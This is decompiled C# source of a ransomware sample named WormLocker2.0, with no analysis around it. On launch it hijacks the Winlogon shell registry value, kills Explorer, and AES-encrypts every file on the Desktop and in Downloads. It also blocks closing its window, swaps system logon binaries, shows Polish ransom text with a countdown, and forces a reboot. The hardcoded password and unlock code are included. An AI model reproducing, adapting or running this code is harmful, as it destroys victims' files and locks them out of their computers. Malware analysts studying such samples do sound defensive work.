// Decompiled with JetBrains decompiler
// Type: WormLocker2._0.WormLocker2
// Assembly: WormLocker2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A054C21-6A1C-44F6-A7D9-5CF75F029D7C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-6e755b8e48017e2747c4243f70e5c2c78e23d690c837b58855d46de17152f4f3.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace WormLocker2._0
{
  public class WormLocker2 : Form
  {
    private IContainer components = (IContainer) null;
    private Timer tmr_del_desktop;
    private Timer tmr_start_enc;
    private Timer tmr_unhide;
    private Timer tmr_out;
    private Label label1;
    private TextBox textBox1;
    private TextBox textBox2;
    private TextBox textBox3;
    private Label label2;

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool block);

    public WormLocker2()
    {
      this.InitializeComponent();
      this.label1.Text = TimeSpan.FromMinutes(120.0).ToString();
    }

    private void WormLocker2_Load(object sender, EventArgs e)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      string str = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads");
      this.Location = new Point(-1000, -1000);
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "empty", RegistryValueKind.String);
      File.WriteAllText(folderPath + "\\worm_tool.sys", "encrypted");
      File.WriteAllText(str + "\\worm_tool.sys", "encrypted");
      this.tmr_del_desktop.Start();
      this.tmr_start_enc.Start();
      this.tmr_out.Start();
      DateTime startTime = DateTime.Now;
      Timer timer = new Timer() { Interval = 1000 };
      timer.Tick += (EventHandler) ((obj, args) => this.label1.Text = (TimeSpan.FromMinutes(180.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
      timer.Enabled = true;
      this.tmr_unhide.Start();
    }

    private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private static void Start_Encrypt()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      string str = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads");
      string[] files1 = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
      string[] files2 = Directory.GetFiles(str + "\\", "*", SearchOption.AllDirectories);
      WormLocker2._0.WormLocker2.EncryptionFile encryptionFile = new WormLocker2._0.WormLocker2.EncryptionFile();
      string password = "21&37RDX";
      for (int index = 0; index < files1.Length; ++index)
        encryptionFile.EncryptFile(files1[index], password);
      for (int index = 0; index < files2.Length; ++index)
        encryptionFile.EncryptFile(files2[index], password);
    }

    private void tmr_del_desktop_Tick(object sender, EventArgs e)
    {
      this.tmr_del_desktop.Stop();
      string path1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\desktop.ini";
      string path2 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + "\\desktop.ini";
      if (File.Exists(path1))
        File.Delete(path1);
      if (File.Exists(path2))
        File.Delete(path2);
      this.tmr_del_desktop.Start();
    }

    private void tmr_start_enc_Tick(object sender, EventArgs e)
    {
      this.tmr_start_enc.Stop();
      WormLocker2._0.WormLocker2.Start_Encrypt();
    }

    private void tmr_unhide_Tick(object sender, EventArgs e)
    {
      this.tmr_unhide.Stop();
      foreach (Process process in Process.GetProcessesByName("explorer"))
        process.Kill();
      Process.Start("C:\\Windows\\System32\\ransom_voice.vbs");
      this.CenterToScreen();
      WormLocker2._0.WormLocker2.Thawouse();
    }

    public static void Thawouse() => WormLocker2._0.WormLocker2.BlockInput(false);

    private void DECRYPT_Click(object sender, EventArgs e)
    {
      if (this.textBox1.Text == "")
      {
        int num1 = (int) MessageBox.Show("Zły kod:)", "Jeszcze 4 próby", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (this.textBox1.Text == "3GODZINY")
      {
        int num2 = (int) MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) "", RegistryValueKind.String);
        File.Delete("C:\\Windows\\System32\\LogonUI.exe");
        File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
        File.Delete("C:\\Windows\\System32\\LogonUItrue.exe");
        File.Delete("C:\\Windows\\System32\\LogonUIinf.exe");
        WormLocker2._0.WormLocker2.OFF_Encrypt();
        Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "explorer.exe", RegistryValueKind.String);
        Process.Start("C:\\Windows\\explorer.exe");
        foreach (Process process in Process.GetProcessesByName("WormLocker2.0"))
          process.Kill();
      }
      else
      {
        int num3 = (int) MessageBox.Show("Zły kod:)", "Jeszcze 4 próby", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private static void OFF_Encrypt()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      string str = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads");
      string[] files1 = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
      string[] files2 = Directory.GetFiles(str + "\\", "*", SearchOption.AllDirectories);
      WormLocker2._0.WormLocker2.DecryptionFile decryptionFile = new WormLocker2._0.WormLocker2.DecryptionFile();
      string password = "21&37RDX";
      for (int index = 0; index < files1.Length; ++index)
        decryptionFile.DecryptFile(files1[index], password);
      for (int index = 0; index < files2.Length; ++index)
      {
        decryptionFile.DecryptFile(files2[index], password);
        WormLocker2._0.WormLocker2.Thawouse();
      }
    }

    private void tmr_out_Tick(object sender, EventArgs e)
    {
      this.tmr_out.Stop();
      Process.Start("shutdown", "/r /t 0");
      foreach (Process process in Process.GetProcessesByName("wscript"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("WormLocker2.0"))
        process.Kill();
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (WormLocker2._0.WormLocker2));
      this.tmr_del_desktop = new Timer(this.components);
      this.tmr_start_enc = new Timer(this.components);
      this.tmr_unhide = new Timer(this.components);
      this.tmr_out = new Timer(this.components);
      this.label1 = new Label();
      this.textBox1 = new TextBox();
      this.textBox2 = new TextBox();
      this.textBox3 = new TextBox();
      this.label2 = new Label();
      this.SuspendLayout();
      this.tmr_del_desktop.Enabled = true;
      this.tmr_del_desktop.Tick += new EventHandler(this.tmr_del_desktop_Tick);
      this.tmr_start_enc.Enabled = true;
      this.tmr_start_enc.Interval = 3000;
      this.tmr_start_enc.Tick += new EventHandler(this.tmr_start_enc_Tick);
      this.tmr_unhide.Interval = 10000;
      this.tmr_unhide.Tick += new EventHandler(this.tmr_unhide_Tick);
      this.tmr_out.Enabled = true;
      this.tmr_out.Interval = 7200000;
      this.tmr_out.Tick += new EventHandler(this.tmr_out_Tick);
      this.label1.AutoSize = true;
      this.label1.Location = new Point(321, 383);
      this.label1.Name = "label1";
      this.label1.Size = new Size(41, 20);
      this.label1.TabIndex = 0;
      this.label1.Text = "virus";
      this.textBox1.Location = new Point(227, 383);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(76, 26);
      this.textBox1.TabIndex = 1;
      this.textBox2.Location = new Point(227, 415);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(215, 26);
      this.textBox2.TabIndex = 2;
      this.textBox2.Text = "HAHAHAHA TO NIE KONCIEC !!!";
      this.textBox3.BackColor = System.Drawing.Color.FromArgb(35, 39, 42);
      this.textBox3.BorderStyle = BorderStyle.None;
      this.textBox3.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox3.ForeColor = SystemColors.MenuBar;
      this.textBox3.Location = new Point(530, 115);
      this.textBox3.Margin = new Padding(4, 5, 4, 5);
      this.textBox3.Multiline = true;
      this.textBox3.Name = "textBox3";
      this.textBox3.ReadOnly = true;
      this.textBox3.ScrollBars = ScrollBars.Vertical;
      this.textBox3.Size = new Size(522, 478);
      this.textBox3.TabIndex = 4;
      this.textBox3.TabStop = false;
      this.textBox3.Text = componentResourceManager.GetString("textBox3.Text");
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 24f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = System.Drawing.Color.Red;
      this.label2.Location = new Point(532, 55);
      this.label2.Margin = new Padding(4, 0, 4, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(845, 55);
      this.label2.TabIndex = 5;
      this.label2.Text = "OH NIE ! Twój komputer ma virusa !. ;(";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(1396, 612);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.textBox3);
      this.Controls.Add((Control) this.textBox2);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label1);
      this.DoubleBuffered = true;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(4, 5, 4, 5);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (WormLocker2);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Worm Locker 2.0";
      this.TopMost = true;
      this.FormClosing += new FormClosingEventHandler(this.WormLocker2_FormClosing);
      this.Load += new EventHandler(this.WormLocker2_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public class CoreEncryption
    {
      public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
      {
        byte[] numArray = (byte[]) null;
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
              cryptoStream.Close();
            }
            numArray = memoryStream.ToArray();
          }
        }
        return numArray;
      }
    }

    public class CoreDecryption
    {
      public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
      {
        byte[] numArray = (byte[]) null;
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
              cryptoStream.Close();
            }
            numArray = memoryStream.ToArray();
          }
        }
        return numArray;
      }
    }

    public class EncryptionFile
    {
      public void EncryptFile(string file, string password)
      {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes1 = Encoding.UTF8.GetBytes(password);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = WormLocker2._0.WormLocker2.CoreEncryption.AES_Encrypt(bytesToBeEncrypted, hash);
        File.WriteAllBytes(file, bytes2);
      }
    }

    public class DecryptionFile
    {
      public void DecryptFile(string fileEncrypted, string password)
      {
        byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
        byte[] bytes1 = Encoding.UTF8.GetBytes(password);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = WormLocker2._0.WormLocker2.CoreDecryption.AES_Decrypt(bytesToBeDecrypted, hash);
        File.WriteAllBytes(fileEncrypted, bytes2);
      }
    }
  }
}
